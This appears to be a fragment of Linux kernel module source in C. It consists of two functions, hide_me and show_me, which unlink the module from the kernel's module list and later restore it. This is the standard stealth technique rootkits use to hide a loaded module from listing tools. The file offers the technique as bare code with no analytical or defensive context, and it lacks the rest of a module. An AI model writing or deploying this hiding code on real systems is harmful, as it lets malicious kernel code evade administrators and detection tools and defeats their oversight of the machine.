#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>

static struct list_head *prev_module;

void hide_me(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_me(void){
    list_add(&THIS_MODULE->list, prev_module);
}